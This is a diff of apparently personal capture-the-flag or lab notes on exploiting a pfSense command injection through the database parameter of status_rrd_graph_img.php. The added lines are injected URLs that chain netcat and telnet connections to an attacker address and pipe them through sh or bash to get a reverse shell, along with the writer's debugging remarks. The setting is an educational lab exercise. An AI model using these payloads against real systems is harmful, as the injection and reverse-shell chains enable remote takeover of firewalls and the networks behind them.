@@ -49,9 +49,16 @@ https://www.proteansec.com/linux/pfsense-vulnerabilities-part-2-command-injectio
 can execute command like this:
 https://10.10.10.60/status_rrd_graph_img.php?database=queues;nc+10.10.15.41+4444
 
+https://10.10.10.60/status_rrd_graph_img.php?database=queues;cd+..;cd+..;cd+..;cd+bin;nc+10.10.15.41+445+|+sh
 I can make the service ping me, but can't seems to get a reverse shell up.
 
 curl maybe to download file ? 
 Maybe the port am using on NC get blocked try 80 or 443
 
 try telnet reserve shell to see if both command get executed
+
+Test is both commands get executed
+https://10.10.10.60/status_rrd_graph_img.php?database=queues;cd+..;cd+..;cd+..;cd+bin;telnet+10.10.15.41+80+|+telnet+10.10.15.41+445
+both commands get executed, but connection fails med det samme. 
+all three ?
+https://10.10.10.60/status_rrd_graph_img.php?database=queues;cd+..;cd+..;cd+..;cd+bin;telnet+10.10.15.41+80+|+bash+|+telnet+10.10.15.41+445
